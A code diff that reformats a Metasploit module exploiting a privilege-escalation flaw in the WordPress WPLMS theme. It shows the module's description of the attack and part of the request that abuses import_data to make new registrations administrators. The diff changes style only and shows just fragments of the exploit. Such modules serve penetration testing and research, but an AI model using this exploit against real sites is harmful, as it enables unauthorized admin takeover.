@@ -7,10 +7,11 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HTTP::Wordpress
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name'            => 'WordPress WPLMS Theme Privilege Escalation',
-      'Description'     => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'WordPress WPLMS Theme Privilege Escalation',
+        'Description' => %q{
           The WordPress WPLMS theme from version 1.5.2 to 1.8.4.1 allows an
           authenticated user of any user level to set any system option due to a lack of
           validation in the import_data function of /includes/func.php.
@@ -21,25 +22,25 @@ class MetasploitModule < Msf::Auxiliary
           role to be administrator.  This will allow for the user to create a new account
           with admin privileges via the default registration page found at
           /wp-login.php?action=register.
-      },
-      'Author'          =>
-        [
-          'Evex',     # Vulnerability discovery
+        },
+        'Author' => [
+          'Evex', # Vulnerability discovery
           'rastating' # Metasploit module
         ],
-      'License'         => MSF_LICENSE,
-      'References'      =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['WPVDB', '7785']
         ],
-      'DisclosureDate'  => '2015-02-09'
-      ))
+        'DisclosureDate' => '2015-02-09'
+      )
+    )
 
     register_options(
       [
         OptString.new('USERNAME', [true, 'The WordPress username to authenticate with']),
         OptString.new('PASSWORD', [true, 'The WordPress password to authenticate with'])
-      ])
+      ]
+    )
   end
 
   def check
@@ -77,11 +78,11 @@ class MetasploitModule < Msf::Auxiliary
       vprint_error("Failed to serialize #{value}.")
     else
       res = send_request_cgi(
-        'method'    => 'POST',
-        'uri'       => wordpress_url_admin_ajax,
-        'vars_get'  => { 'action' => 'import_data' },
+        'method' => 'POST',
+        'uri' => wordpress_url_admin_ajax,
+        'vars_get' => { 'action' => 'import_data' },
         'vars_post' => { 'name' => name, 'code' => encoded_value },
-        'cookie'    => cookie
+        'cookie' => cookie
       )
 
       if res.nil?
